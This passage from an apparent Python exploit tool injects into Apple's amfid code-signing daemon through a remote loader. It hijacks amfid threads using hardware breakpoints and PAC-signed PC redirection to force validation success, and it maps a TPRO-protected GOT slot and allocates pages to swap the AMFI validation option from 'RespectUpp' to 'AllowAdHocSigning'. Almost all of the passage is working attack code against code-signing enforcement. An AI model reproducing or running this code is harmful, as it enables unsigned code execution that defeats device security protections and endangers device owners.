                                            )
                                        )

                                    if (
                                        signed_redirect_pc & USER_VA_MASK
                                        != redirect_address
                                    ):
                                        raise ProtocolError(
                                            "amfid thread-state PC signing "
                                            "returned an unexpected address: "
                                            f"raw=0x{signed_redirect_pc:x}"
                                        )
                                    struct.pack_into(
                                        "<Q",
                                        old_state,
                                        ARM_THREAD_STATE64_PC_OFFSET,
                                        signed_redirect_pc,
                                    )
                                    new_state_flags = state_flags
                                    if change_pc:
                                        new_state_flags &= (
                                            ~ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC
                                        )
                                    struct.pack_into(
                                        "<I",
                                        old_state,
                                        ARM_THREAD_STATE64_FLAGS_OFFSET,
                                        new_state_flags,
                                    )
                                    if (
                                        not change_pc
                                        and bytes(old_state)
                                        != received_old_state
                                    ):
                                        raise ProtocolError(
                                            "control reply changed the "
                                            "received thread state"
                                        )
                                    print(
                                        "amfid-hwbp-exception-received "
                                        f"bits=0x{request_bits:x} "
                                        f"size={request_size} "
                                        f"replyPort=0x{reply_port:x} "
                                        f"requestPort=0x{request_port:x} "
                                        f"id={request_id} "
                                        f"threadId={thread_id} "
                                        f"exception={exception_type} "
                                        f"codeCount={code_count} "
                                        f"flavor={state_flavor} "
                                        f"stateCount={old_state_count} "
                                        f"pcRaw=0x{trapped_pc_raw:x} "
                                        f"pc=0x{trapped_pc:x} "
                                        f"flags=0x{state_flags:x} "
                                        f"newFlags=0x{new_state_flags:x} "
                                        f"pcDiscriminator=0x{pc_discriminator:x} "
                                        f"redirect=0x{redirect_address:x} "
                                        f"signedRedirect=0x{signed_redirect_pc:x}"
                                    )

                                    reply_size = 44 + old_state_size
                                    if (
                                        reply_size
                                        > MACH_EXCEPTION_REPLY_CAPACITY
                                    ):
                                        raise ProtocolError(
                                            "amfid exception reply is too "
                                            f"large: {reply_size}"
                                        )
                                    reply_id = (
                                        MACH_EXCEPTION_STATE_REPLY_ID
                                        if args.amfid_state_only_control
                                        else MACH_EXCEPTION_REPLY_ID
                                    )
                                    reply = bytearray(reply_size)
                                    struct.pack_into(
                                        "<IIIIII",
                                        reply,
                                        0,
                                        reply_disposition,
                                        reply_size,
                                        reply_port,
                                        0,
                                        0,
                                        reply_id,
                                    )
                                    reply[24:32] = request_message[
                                        ndr_offset : ndr_offset + 8
                                    ]
                                    struct.pack_into(
                                        "<iII",
                                        reply,
                                        32,
                                        0,
                                        ARM_THREAD_STATE64,
                                        ARM_THREAD_STATE64_COUNT,
                                    )
                                    reply[44:] = old_state
                                    reply_address = (
                                        scratch
                                        + MACH_EXCEPTION_REPLY_OFFSET
                                    )
                                    await write_memory(
                                        remote, reply_address, bytes(reply)
                                    )
                                    send_result = await call_loader(
                                        "mach_msg_reply_amfid_exception",
                                        mach_msg_address,
                                        (
                                            reply_address,
                                            MACH_SEND_MSG,
                                            reply_size,
                                            0,
                                            0,
                                            0,
                                            0,
                                        ),
                                    )
                                    if send_result & 0xFFFFFFFF:
                                        raise ProtocolError(
                                            "mach_msg reply failed: "
                                            f"0x{send_result & 0xFFFFFFFF:x}"
                                        )
                                    await call_loader(
                                        "voucher_mach_msg_revert_amfid_"
                                        "exception",
                                        voucher_mach_msg_revert_address,
                                        (voucher_state,),
                                    )
                                    voucher_state = None
                                    print(
                                        "amfid-hwbp-exception-reply-sent "
                                        f"behavior={'state-control' if args.amfid_state_only_control else 'state-identity-protected'} "
                                        f"bits=0x{reply_disposition:x} "
                                        f"size={reply_size} "
                                        f"id={reply_id} "
                                        f"mach=0x{send_result & 0xFFFFFFFF:x}"
                                    )

                                    trigger_returncode, trigger_output = (
                                        await asyncio.wait_for(
                                            trigger_task, 25
                                        )
                                    )
                                    trigger_task = None
                                    print(
                                        "amfid-hwbp-trigger-result "
                                        f"rc={trigger_returncode} output="
                                        + re.sub(
                                            r"\s+", " ", trigger_output
                                        ).strip()
                                    )
                                    suspend_result = await call_loader(
                                        "task_suspend_amfid_redirect_cleanup",
                                        task_suspend_address,
                                        (target_task,),
                                    )
                                    if suspend_result & 0xFFFFFFFF:
                                        raise ProtocolError(
                                            "task_suspend(amfid redirect "
                                            "cleanup) failed: "
                                            f"{suspend_result & 0xFFFFFFFF}"
                                        )
                                    target_suspended = True
                                    target_resumed_for_redirect = False
                                    print(
                                        "amfid-hwbp-redirect-event=success "
                                        f"threadId={thread_id} "
                                        f"pc=0x{trapped_pc:x} "
                                        f"redirect=0x{redirect_address:x} "
                                        "forcedSuccess="
                                        f"{int(can_force_success)} "
                                        f"triggerRc={trigger_returncode} "
                                        "trigger="
                                        + re.sub(
                                            r"\s+", " ", trigger_output
                                        ).strip()
                                    )

                                preflight_completed = True
                            finally:
                                if voucher_state is not None:
                                    try:
                                        await call_loader(
                                            "voucher_mach_msg_revert_amfid_"
                                            "cleanup",
                                            voucher_mach_msg_revert_address,
                                            (voucher_state,),
                                        )
                                        voucher_state = None
                                    except BaseException as error:
                                        cleanup_failures.append(
                                            f"voucher-revert: {error}"
                                        )
                                if trigger_task is not None:
                                    trigger_task.cancel()
                                    try:
                                        await trigger_task
                                    except BaseException:
                                        pass
                                    trigger_task = None
                                if (
                                    target_resumed_for_redirect
                                    and not target_suspended
                                ):
                                    kill_result_raw = await call_loader(
                                        "kill_amfid_redirect_recovery",
                                        image_base + KILL_STUB_OFFSET,
                                        (target_pid, SIGKILL),
                                    )
                                    kill_result = struct.unpack(
                                        "<i",
                                        struct.pack(
                                            "<I",
                                            kill_result_raw & 0xFFFFFFFF,
                                        ),
                                    )[0]
                                    if kill_result != 0:
                                        cleanup_failures.append(
                                            "redirect-recovery-kill="
                                            f"{kill_result}"
                                        )
                                    else:
                                        target_restarted_for_recovery = True
                                    target_resumed_for_redirect = False
                                    target_suspended = False
                                if (
                                    task_original is not None
                                    and not target_restarted_for_recovery
                                ):
                                    try:
                                        await set_debug_state(
                                            "task_set_state_amfid_debug_"
                                            "cleanup",
                                            task_set_state_address,
                                            target_task,
                                            task_original,
                                        )
                                    except BaseException as error:
                                        cleanup_failures.append(
                                            f"task-state: {error}"
                                        )
                                for index, (
                                    thread_port,
                                    original,
                                ) in enumerate(thread_originals):
                                    if target_restarted_for_recovery:
                                        break
                                    try:
                                        await set_debug_state(
                                            "thread_set_state_amfid_debug_"
                                            f"cleanup_{index}",
                                            thread_set_state_address,
                                            thread_port,
                                            original,
                                        )
                                    except BaseException as error:
                                        cleanup_failures.append(
                                            f"thread-{index}: {error}"
                                        )
                                if (
                                    exception_port_installed
                                    and not target_restarted_for_recovery
                                ):
                                    try:
                                        restore_exception_result = (
                                            await call_loader(
                                                "task_set_exception_ports_"
                                                "amfid_restore",
                                                task_set_exception_ports_address,
                                                (
                                                    target_task,
                                                    EXC_MASK_BREAKPOINT,
                                                    0,
                                                    0,
                                                    0,
                                                ),
                                            )
                                        )
                                        if (
                                            restore_exception_result
                                            & 0xFFFFFFFF
                                        ):
                                            raise ProtocolError(
                                                "mach="
                                                f"{restore_exception_result & 0xFFFFFFFF}"
                                            )
                                        exception_port_installed = False
                                    except BaseException as error:
                                        cleanup_failures.append(
                                            "exception-port: " f"{error}"
                                        )
                                if exception_port != 0:
                                    try:
                                        destroy_result = await call_loader(
                                            "mach_port_destroy_amfid_"
                                            "exception",
                                            mach_port_destroy_address,
                                            (task_self, exception_port),
                                        )
                                        if destroy_result & 0xFFFFFFFF:
                                            raise ProtocolError(
                                                "mach="
                                                f"{destroy_result & 0xFFFFFFFF}"
                                            )
                                        exception_port = 0
                                    except BaseException as error:
                                        cleanup_failures.append(
                                            "local-exception-port: "
                                            f"{error}"
                                        )
                                if cleanup_failures:
                                    if not target_restarted_for_recovery:
                                        kill_result_raw = await call_loader(
                                            "kill_amfid_debug_cleanup_"
                                            "recovery",
                                            image_base + KILL_STUB_OFFSET,
                                            (target_pid, SIGKILL),
                                        )
                                        cleanup_failures.append(
                                            "recovery-kill="
                                            f"{kill_result_raw & 0xFFFFFFFF}"
                                        )
                                    target_suspended = False
                                elif target_suspended:
                                    resume_result = await call_loader(
                                        "task_resume_amfid_debug_preflight",
                                        task_resume_address,
                                        (target_task,),
                                    )
                                    if resume_result & 0xFFFFFFFF:
                                        cleanup_failures.append(
                                            "task-resume="
                                            f"{resume_result & 0xFFFFFFFF}"
                                        )
                                    else:
                                        target_suspended = False

                            if cleanup_failures:
                                raise ProtocolError(
                                    "amfid debug-state cleanup failed: "
                                    + "; ".join(cleanup_failures)
                                )
                            if not preflight_completed:
                                raise ProtocolError(
                                    "amfid debug-state preflight did not "
                                    "complete"
                                )
                            print(
                                (
                                    "amfid-hwbp-redirect-probe=success "
                                    if args.amfid_hwbp_redirect_probe
                                    is not None
                                    else "amfid-debug-state-preflight=success "
                                )
                                +
                                f"pid={target_pid} threads="
                                f"{len(thread_originals)} branch="
                                f"0x{branch_address:x} restored=1"
                            )
                            return 0

                        if (
                            args.amfid_adhoc_option_inspect is not None
                            or args.amfid_lazy_load_preflight is not None
                            or args.amfid_adhoc_option_probe is not None
                        ):
                            local_dyld_info_address = (
                                scratch + LOCAL_DYLD_INFO_OFFSET
                            )
                            local_dyld_count_address = (
                                scratch + LOCAL_DYLD_COUNT_OFFSET
                            )
                            await write_memory(
                                remote,
                                local_dyld_info_address,
                                b"\0" * 24,
                            )
                            await write_memory(
                                remote,
                                local_dyld_count_address,
                                struct.pack("<I", TASK_DYLD_INFO_COUNT),
                            )
                            local_dyld_result = await call_loader(
                                "task_info_loader_dyld_amfid_adhoc",
                                image_base + TASK_INFO_STUB_OFFSET,
                                (
                                    task_self,
                                    TASK_DYLD_INFO,
                                    local_dyld_info_address,
                                    local_dyld_count_address,
                                ),
                            )
                            if local_dyld_result & 0xFFFFFFFF:
                                raise ProtocolError(
                                    "loader TASK_DYLD_INFO failed: "
                                    f"{local_dyld_result & 0xFFFFFFFF}"
                                )
                            local_all_image_info = struct.unpack(
                                "<Q",
                                await read_memory(
                                    remote, local_dyld_info_address, 8
                                ),
                            )[0]
                            if local_all_image_info == 0:
                                raise ProtocolError(
                                    "loader TASK_DYLD_INFO returned null"
                                )

                            async def resolve_loader_adhoc_symbol(
                                label: str, image_path: str, symbol: str
                            ) -> int:
                                local_address = await set_local_string(
                                    image_path
                                )
                                local_image_raw = await call_loader(
                                    "getRemoteImageAddress_loader_adhoc_"
                                    + label,
                                    image_base
                                    + GET_REMOTE_IMAGE_ADDRESS_OFFSET,
                                    (
                                        task_self,
                                        local_all_image_info,
                                        local_address,
                                    ),
                                )
                                local_image = local_image_raw & USER_VA_MASK
                                symbol_address = await set_local_string(symbol)
                                result_raw = await call_loader(
                                    "remoteDlSym_loader_adhoc_"
                                    + label
                                    + "_"
                                    + symbol.lstrip("_"),
                                    image_base + REMOTE_DLSYM_OFFSET,
                                    (
                                        task_self,
                                        local_image,
                                        symbol_address,
                                    ),
                                )
                                result = result_raw & USER_VA_MASK
                                if local_image == 0 or result == 0:
                                    raise ProtocolError(
                                        "could not resolve loader-local "
                                        f"{symbol} in {image_path}"
                                    )
                                return result

                            mach_vm_region_recurse_address = (
                                await resolve_loader_adhoc_symbol(
                                    "libsystem_kernel",
                                    "/usr/lib/system/libsystem_kernel.dylib",
                                    "_mach_vm_region_recurse",
                                )
                            )
                            framework_path_address = await set_local_string(
                                AMFI_FRAMEWORK_PATH
                            )
                            framework_base_raw = await call_loader(
                                "getRemoteImageAddress_amfi_adhoc",
                                image_base + GET_REMOTE_IMAGE_ADDRESS_OFFSET,
                                (
                                    target_task,
                                    all_image_info,
                                    framework_path_address,
                                ),
                            )
                            framework_base = framework_base_raw & USER_VA_MASK
                            if framework_base == 0:
                                raise ProtocolError(
                                    "AppleMobileFileIntegrity framework is "
                                    "not loaded in amfid"
                                )
                            option_load_address = (
                                framework_base
                                + AMFI_VALIDATE_OPTION_LOAD_OFFSET
                            )
                            observed_option_load = await read_target(
                                "amfid_adhoc_option_load",
                                option_load_address,
                                len(AMFI_VALIDATE_OPTION_LOAD_ORIGINAL),
                            )
                            if (
                                observed_option_load
                                != AMFI_VALIDATE_OPTION_LOAD_ORIGINAL
                            ):
                                raise ProtocolError(
                                    "exact AMFI option-load context mismatch: "
                                    f"{observed_option_load.hex()}"
                                )

                            respect_global = await resolve_image_symbol(
                                "libmis_respect_upp_option",
                                LIBMIS_PATH,
                                "_kMISValidationOptionRespectUppTrustAndAuthorization",
                            )
                            allow_adhoc_global = await resolve_image_symbol(
                                "libmis_allow_adhoc_option",
                                LIBMIS_PATH,
                                "_kMISValidationOptionAllowAdHocSigning",
                            )
                            if (
                                respect_global == allow_adhoc_global
                                or respect_global & 7
                                or allow_adhoc_global & 7
                            ):
                                raise ProtocolError(
                                    "invalid or aliased libmis option globals: "
                                    f"respect=0x{respect_global:x} "
                                    f"allow-adhoc=0x{allow_adhoc_global:x}"
                                )
                            respect_key = struct.unpack(
                                "<Q",
                                await read_target(
                                    "libmis_respect_upp_key",
                                    respect_global,
                                    8,
                                ),
                            )[0]
                            allow_adhoc_key = struct.unpack(
                                "<Q",
                                await read_target(
                                    "libmis_allow_adhoc_key",
                                    allow_adhoc_global,
                                    8,
                                ),
                            )[0]
                            if (
                                respect_key == 0
                                or allow_adhoc_key == 0
                                or respect_key == allow_adhoc_key
                            ):
                                raise ProtocolError(
                                    "invalid or aliased libmis option keys: "
                                    f"respect=0x{respect_key:x} "
                                    f"allow-adhoc=0x{allow_adhoc_key:x}"
                                )

                            got_address = (
                                framework_base + AMFI_RESPECT_UPP_GOT_OFFSET
                            )
                            got_page = got_address & ~(DONOR_PAGE_SIZE - 1)
                            if got_address & 7 or (
                                got_address + 8
                                > got_page + DONOR_PAGE_SIZE
                            ):
                                raise ProtocolError(
                                    "invalid AMFI option GOT address: "
                                    f"0x{got_address:x}"
                                )
                            adrp_instruction, ldr_instruction, _ = (
                                struct.unpack(
                                    "<III", observed_option_load
                                )
                            )
                            adrp_immediate = (
                                ((adrp_instruction >> 5) & 0x7FFFF) << 2
                            ) | ((adrp_instruction >> 29) & 3)
                            if adrp_immediate & (1 << 20):
                                adrp_immediate -= 1 << 21
                            decoded_got = (
                                (option_load_address & ~0xFFF)
                                + (adrp_immediate << 12)
                                + (((ldr_instruction >> 10) & 0xFFF) * 8)
                            )
                            if decoded_got != got_address:
                                raise ProtocolError(
                                    "live AMFI option load does not address "
                                    "the expected GOT slot: decoded="
                                    f"0x{decoded_got:x} expected="
                                    f"0x{got_address:x}"
                                )
                            respect_pointer = struct.pack(
                                "<Q", respect_global
                            )
                            allow_adhoc_pointer = struct.pack(
                                "<Q", allow_adhoc_global
                            )
                            observed_got = await read_target(
                                "amfid_respect_upp_got",
                                got_address,
                                8,
                            )
                            if args.amfid_adhoc_option_inspect is not None:
                                if observed_got == respect_pointer:
                                    option_state = "respect-upp"
                                elif observed_got == allow_adhoc_pointer:
                                    option_state = "allow-adhoc"
                                else:
                                    raise ProtocolError(
                                        "AMFI option GOT points at neither "
                                        "validated libmis global: observed="
                                        f"{observed_got.hex()}"
                                    )
                                print(
                                    "ptrauth-loader-amfid-adhoc-option-"
                                    f"inspect=success loader-pid={args.pid} "
                                    f"target-pid={target_pid} "
                                    f"got=0x{got_address:x} "
                                    f"state={option_state}"
                                )
                                return 0
                            if observed_got != respect_pointer:
                                raise ProtocolError(
                                    "AMFI RespectUpp GOT invariant mismatch: "
                                    f"expected={respect_pointer.hex()} "
                                    f"observed={observed_got.hex()}"
                                )

                            region_address_pointer = (
                                scratch + REGION_ADDRESS_OFFSET
                            )
                            region_size_pointer = scratch + REGION_SIZE_OFFSET
                            region_depth_pointer = (
                                scratch + REGION_DEPTH_OFFSET
                            )
                            region_info_pointer = scratch + REGION_INFO_OFFSET
                            region_count_pointer = scratch + REGION_COUNT_OFFSET
                            region_address = 0
                            region_size = 0
                            region_info = b""
                            region_depth = 0
                            for _ in range(8):
                                await write_memory(
                                    remote,
                                    region_address_pointer,
                                    struct.pack("<Q", got_address),
                                )
                                await write_memory(
                                    remote, region_size_pointer, b"\0" * 8
                                )
                                await write_memory(
                                    remote,
                                    region_depth_pointer,
                                    struct.pack("<I", region_depth),
                                )
                                await write_memory(
                                    remote,
                                    region_info_pointer,
                                    b"\0" * VM_REGION_SUBMAP_INFO_SIZE_64,
                                )
                                await write_memory(
                                    remote,
                                    region_count_pointer,
                                    struct.pack(
                                        "<I",
                                        VM_REGION_SUBMAP_INFO_COUNT_64,
                                    ),
                                )
                                region_result = await call_loader(
                                    "mach_vm_region_recurse_amfid_adhoc",
                                    mach_vm_region_recurse_address,
                                    (
                                        target_task,
                                        region_address_pointer,
                                        region_size_pointer,
                                        region_depth_pointer,
                                        region_info_pointer,
                                        region_count_pointer,
                                    ),
                                )
                                if region_result & 0xFFFFFFFF:
                                    raise ProtocolError(
                                        "amfid GOT region query failed: "
                                        f"{region_result & 0xFFFFFFFF}"
                                    )
                                region_address = struct.unpack(
                                    "<Q",
                                    await read_memory(
                                        remote, region_address_pointer, 8
                                    ),
                                )[0]
                                region_size = struct.unpack(
                                    "<Q",
                                    await read_memory(
                                        remote, region_size_pointer, 8
                                    ),
                                )[0]
                                region_depth = struct.unpack(
                                    "<I",
                                    await read_memory(
                                        remote, region_depth_pointer, 4
                                    ),
                                )[0]
                                region_info = await read_memory(
                                    remote,
                                    region_info_pointer,
                                    VM_REGION_SUBMAP_INFO_SIZE_64,
                                )
                                is_submap = struct.unpack_from(
                                    "<I",
                                    region_info,
                                    VM_REGION_SUBMAP_INFO_IS_SUBMAP_OFFSET,
                                )[0]
                                if not is_submap:
                                    break
                                region_depth += 1
                            else:
                                raise ProtocolError(
                                    "amfid GOT region nesting exceeded limit"
                                )
                            region_current = struct.unpack_from(
                                "<i", region_info, 0
                            )[0]
                            region_maximum = struct.unpack_from(
                                "<i", region_info, 4
                            )[0]
                            region_flags = struct.unpack_from(
                                "<H",
                                region_info,
                                VM_REGION_SUBMAP_INFO_FLAGS_OFFSET,
                            )[0]
                            if not (
                                region_address <= got_address
                                and got_address + 8
                                <= region_address + region_size
                            ):
                                raise ProtocolError(
                                    "amfid GOT region does not cover the "
                                    "validated slot"
                                )
                            if (
                                region_current != VM_PROT_READ
                                or not (
                                    region_maximum
                                    & (VM_PROT_READ | VM_PROT_WRITE)
                                    == (VM_PROT_READ | VM_PROT_WRITE)
                                )
                                or not (
                                    region_flags
                                    & VM_REGION_FLAG_TPRO_ENABLED
                                )
                            ):
                                raise ProtocolError(
                                    "amfid GOT is not the expected RO TPRO "
                                    "mapping: current="
                                    f"0x{region_current:x} maximum="
                                    f"0x{region_maximum:x} flags="
                                    f"0x{region_flags:x}"
                                )
                            print(
                                "amfid-adhoc-got-region "
                                f"address=0x{region_address:x} "
                                f"size=0x{region_size:x} "
                                f"current=0x{region_current:x} "
                                f"maximum=0x{region_maximum:x} "
                                f"flags=0x{region_flags:x} tpro=1"
                            )

                            dyld_infos_prefix = await read_target(
                                "amfid_dyld_all_image_infos_prefix",
                                all_image_info,
                                0x28,
                            )
                            dyld_infos_version, dyld_image_count = (
                                struct.unpack_from(
                                    "<II", dyld_infos_prefix, 0
                                )
                            )
                            dyld_base = (
                                struct.unpack_from(
                                    "<Q", dyld_infos_prefix, 0x20
                                )[0]
                                & USER_VA_MASK
                            )
                            if (
                                dyld_infos_version < 2
                                or dyld_image_count == 0
                                or dyld_image_count > 4096
                                or dyld_base == 0
                            ):
                                raise ProtocolError(
                                    "amfid has invalid dyld_all_image_infos: "
                                    f"version={dyld_infos_version} "
                                    f"count={dyld_image_count} "
                                    f"dyld=0x{dyld_base:x}"
                                )
                            observed_dyld_magic = await read_target(
                                "amfid_dyld_mach_header_magic",
                                dyld_base,
                                4,
                            )
                            if observed_dyld_magic != struct.pack(
                                "<I", MH_MAGIC_64
                            ):
                                raise ProtocolError(
                                    "amfid dyld Mach-O header mismatch: "
                                    f"{observed_dyld_magic.hex()}"
                                )
                            tpro_store_callback = (
                                dyld_base
                                + DYLD_TPRO_QWORD_STORE_CALLBACK_OFFSET
                            )
                            observed_callback = await read_target(
                                "dyld_tpro_qword_store_callback",
                                tpro_store_callback,
                                len(
                                    DYLD_TPRO_QWORD_STORE_CALLBACK_ORIGINAL
                                ),
                            )
                            if (
                                observed_callback
                                != DYLD_TPRO_QWORD_STORE_CALLBACK_ORIGINAL
                            ):
                                raise ProtocolError(
                                    "exact dyld TPRO store callback mismatch: "
                                    f"{observed_callback.hex()}"
                                )
                            libdyld_path_address = await set_local_string(
                                LIBDYLD_PATH
                            )
                            libdyld_base_raw = await call_loader(
                                "getRemoteImageAddress_libdyld_tpro",
                                image_base + GET_REMOTE_IMAGE_ADDRESS_OFFSET,
                                (
                                    target_task,
                                    all_image_info,
                                    libdyld_path_address,
                                ),
                            )
                            libdyld_base = libdyld_base_raw & USER_VA_MASK
                            if libdyld_base == 0:
                                raise ProtocolError(
                                    "libdyld is not loaded in amfid"
                                )
                            if (
                                args.amfid_lazy_load_preflight is not None
                                or args.amfid_adhoc_option_probe is not None
                            ):
                                dyld_lazy_load = (
                                    libdyld_base
                                    + LIBDYLD_LAZY_LOAD_OFFSET
                                )
                                observed_lazy_load = await read_target(
                                    "libdyld_lazy_load",
                                    dyld_lazy_load,
                                    len(LIBDYLD_LAZY_LOAD_ORIGINAL),
                                )
                                if (
                                    observed_lazy_load
                                    != LIBDYLD_LAZY_LOAD_ORIGINAL
                                ):
                                    raise ProtocolError(
                                        "exact libdyld lazy-load wrapper "
                                        "mismatch: "
                                        f"{observed_lazy_load.hex()}"
                                    )

                                def decode_lazy_chain(
                                    pointer: int,
                                ) -> tuple[int, int, int, int]:
                                    word = pointer & 0xFFFFFFFF
                                    return (
                                        word & 0xFFFFF,
                                        (word >> 20) & 0x3F,
                                        (word >> 26) & 0x1F,
                                        (word >> 31) & 1,
                                    )

                                respect_value = struct.unpack(
                                    "<Q", respect_pointer
                                )[0]
                                allow_adhoc_value = struct.unpack(
                                    "<Q", allow_adhoc_pointer
                                )[0]
                                respect_chain = decode_lazy_chain(
                                    respect_value
                                )
                                allow_chain = decode_lazy_chain(
                                    allow_adhoc_value
                                )
                                for label, chain in (
                                    ("respect-upp", respect_chain),
                                    ("allow-adhoc", allow_chain),
                                ):
                                    ordinal, _addend, next_count, bind = (
                                        chain
                                    )
                                    if (
                                        bind != 1
                                        or next_count != 0
                                        or ordinal == 0
                                    ):
                                        raise ProtocolError(
                                            f"{label} is not a bounded "
                                            "single-entry 32-bit bind: "
                                            f"ordinal=0x{ordinal:x} "
                                            f"next={next_count} bind={bind}"
                                        )

                                max_ordinal = max(
                                    respect_chain[0], allow_chain[0]
                                )
                                min_ordinal = min(
                                    respect_chain[0], allow_chain[0]
                                )
                                last_symbol_entry = (
                                    AMFID_LAZY_DATA_OFFSET
                                    + AMFID_LAZY_SYMBOL_ARRAY_OFFSET
                                    + max_ordinal * 4
                                    + 4
                                )
                                sparse_span = (
                                    last_symbol_entry
                                    + DONOR_PAGE_SIZE
                                    - 1
                                ) & ~(DONOR_PAGE_SIZE - 1)
                                if sparse_span > 0x200000:
                                    raise ProtocolError(
                                        "synthetic lazy-load descriptor "
                                        "exceeds the fixed 2 MiB bound: "
                                        f"0x{sparse_span:x}"
                                    )

                                mach_vm_allocate_address = (
                                    await resolve_loader_adhoc_symbol(
                                        "libsystem_kernel_allocate",
                                        "/usr/lib/system/"
                                        "libsystem_kernel.dylib",
                                        "_mach_vm_allocate",
                                    )
                                )
                                scan_start = max(
                                    DONOR_PAGE_SIZE,
                                    got_address - 0xFFFFFFFF,
                                )
                                scan_start = (
                                    scan_start + DONOR_PAGE_SIZE - 1
                                ) & ~(DONOR_PAGE_SIZE - 1)
                                scan_end = region_address
                                scan_cursor = scan_start
                                scanned_regions = 0
                                top_level_gaps: list[
                                    tuple[int, int]
                                ] = []
                                allocation_failures: list[int] = []
                                lazy_image_base = 0
                                lazy_symbol_page = 0
                                symbol_array_offset = 0
                                existing_scratch_snapshots: list[
                                    tuple[int, bytes, str]
                                ] = []
                                while (
                                    scan_cursor + DONOR_PAGE_SIZE <= scan_end
                                    and scanned_regions
                                    < DONOR_REGION_SCAN_LIMIT
                                ):
                                    await write_memory(
                                        remote,
                                        region_address_pointer,
                                        struct.pack("<Q", scan_cursor),
                                    )
                                    await write_memory(
                                        remote,
                                        region_size_pointer,
                                        b"\0" * 8,
                                    )
                                    await write_memory(
                                        remote,
                                        region_depth_pointer,
                                        b"\0" * 4,
                                    )
                                    await write_memory(
                                        remote,
                                        region_info_pointer,
                                        b"\0"
                                        * VM_REGION_SUBMAP_INFO_SIZE_64,
                                    )
                                    await write_memory(
                                        remote,
                                        region_count_pointer,
                                        struct.pack(
                                            "<I",
                                            VM_REGION_SUBMAP_INFO_COUNT_64,
                                        ),
                                    )
                                    scan_result = await call_loader(
                                        "mach_vm_region_recurse_amfid_lazy",
                                        mach_vm_region_recurse_address,
                                        (
                                            target_task,
                                            region_address_pointer,
                                            region_size_pointer,
                                            region_depth_pointer,
                                            region_info_pointer,
                                            region_count_pointer,
                                        ),
                                    )
                                    scan_kr = scan_result & 0xFFFFFFFF
                                    if scan_kr == KERN_INVALID_ADDRESS:
                                        next_region_start = scan_end
                                        next_region_size = 0
                                    elif scan_kr != 0:
                                        raise ProtocolError(
                                            "top-level amfid VM scan failed: "
                                            f"{scan_kr}"
                                        )
                                    else:
                                        next_region_start = struct.unpack(
                                            "<Q",
                                            await read_memory(
                                                remote,
                                                region_address_pointer,
                                                8,
                                            ),
                                        )[0]
                                        next_region_size = struct.unpack(
                                            "<Q",
                                            await read_memory(
                                                remote,
                                                region_size_pointer,
                                                8,
                                            ),
                                        )[0]
                                    gap_end = min(
                                        next_region_start, scan_end
                                    )
                                    aligned_gap_end = gap_end & ~(
                                        DONOR_PAGE_SIZE - 1
                                    )
                                    if (
                                        scan_cursor + DONOR_PAGE_SIZE
                                        <= aligned_gap_end
                                    ):
                                        top_level_gaps.append(
                                            (scan_cursor, aligned_gap_end)
                                        )
                                    if scan_kr == KERN_INVALID_ADDRESS:
                                        break
                                    next_cursor = (
                                        next_region_start
                                        + next_region_size
                                        + DONOR_PAGE_SIZE
                                        - 1
                                    ) & ~(DONOR_PAGE_SIZE - 1)
                                    if next_cursor <= scan_cursor:
                                        raise ProtocolError(
                                            "amfid top-level VM scan did "
                                            "not advance"
                                        )
                                    scan_cursor = next_cursor
                                    scanned_regions += 1

                                candidate_pages: list[int] = []
                                for gap_start, gap_end in top_level_gaps:
                                    candidate_pages.append(gap_start)
                                    last_page = gap_end - DONOR_PAGE_SIZE
                                    if last_page != gap_start:
                                        candidate_pages.append(last_page)
                                candidate_pages = sorted(
                                    set(candidate_pages)
                                )
                                entry_run_offset = 0x100
                                entry_span = (
                                    (max_ordinal - min_ordinal) * 4 + 4
                                )
                                if (
                                    entry_run_offset + entry_span
                                    > DONOR_PAGE_SIZE
                                ):
                                    raise ProtocolError(
                                        "lazy-load symbol entries do not fit "
                                        "in one sparse page"
                                    )

                                async def allocate_lazy_page(
                                    address: int, label: str
                                ) -> int:
                                    await write_memory(
                                        remote,
                                        region_address_pointer,
                                        struct.pack("<Q", address),
                                    )
                                    result = await call_loader(
                                        "mach_vm_allocate_amfid_lazy_"
                                        + label,
                                        mach_vm_allocate_address,
                                        (
                                            target_task,
                                            region_address_pointer,
                                            DONOR_PAGE_SIZE,
                                            VM_FLAGS_FIXED,
                                        ),
                                    )
                                    kr = result & 0xFFFFFFFF
                                    allocated = struct.unpack(
                                        "<Q",
                                        await read_memory(
                                            remote,
                                            region_address_pointer,
                                            8,
                                        ),
                                    )[0]
                                    if kr != 0:
                                        allocation_failures.append(kr)
                                        return 0
                                    if allocated != address:
                                        raise ProtocolError(
                                            "fixed amfid sparse allocation "
                                            "moved unexpectedly: "
                                            f"requested=0x{address:x} "
                                            f"got=0x{allocated:x}"
                                        )
                                    remote_allocations.append(
                                        (
                                            allocated,
                                            DONOR_PAGE_SIZE,
                                            "amfid_lazy_load_" + label,
                                        )
                                    )
                                    return allocated

                                for base_page in candidate_pages:
                                    if lazy_image_base != 0:
                                        break
                                    chain_delta = got_address - base_page
                                    if not (
                                        0 < chain_delta <= 0xFFFFFFFF
                                    ):
                                        continue
                                    for entry_page in candidate_pages:
                                        if entry_page == base_page:
                                            continue
                                        entry_for_min_ordinal = (
                                            entry_page + entry_run_offset
                                        )
                                        entry_for_respect = (
                                            entry_for_min_ordinal
                                            + (
                                                respect_chain[0]
                                                - min_ordinal
                                            )
                                            * 4
                                        )
                                        proposed_array_offset = (
                                            entry_for_respect
                                            - (
                                                base_page
                                                + AMFID_LAZY_DATA_OFFSET
                                            )
                                            - respect_chain[0] * 4
                                        )
                                        if not (
                                            0
                                            <= proposed_array_offset
                                            <= 0xFFFFFFFF
                                        ):
                                            continue
                                        allocated_base = (
                                            await allocate_lazy_page(
                                                base_page, "image_page"
                                            )
                                        )
                                        if allocated_base == 0:
                                            break
                                        allocated_entry = (
                                            await allocate_lazy_page(
                                                entry_page, "symbol_page"
                                            )
                                        )
                                        if allocated_entry == 0:
                                            deallocate_result = (
                                                await call_loader(
                                                    "mach_vm_deallocate_"
                                                    "amfid_lazy_retry",
                                                    image_base
                                                    + MACH_VM_DEALLOCATE_STUB_OFFSET,
                                                    (
                                                        target_task,
                                                        allocated_base,
                                                        DONOR_PAGE_SIZE,
                                                    ),
                                                )
                                            )
                                            if (
                                                deallocate_result
                                                & 0xFFFFFFFF
                                            ):
                                                raise ProtocolError(
                                                    "could not roll back a "
                                                    "partial sparse lazy-load "
                                                    "allocation"
                                                )
                                            remote_allocations.pop()
                                            break
                                        lazy_image_base = allocated_base
                                        lazy_symbol_page = allocated_entry
                                        symbol_array_offset = (
                                            proposed_array_offset
                                        )
                                        break
                                if lazy_image_base == 0:
                                    base_scratch_size = 0x200
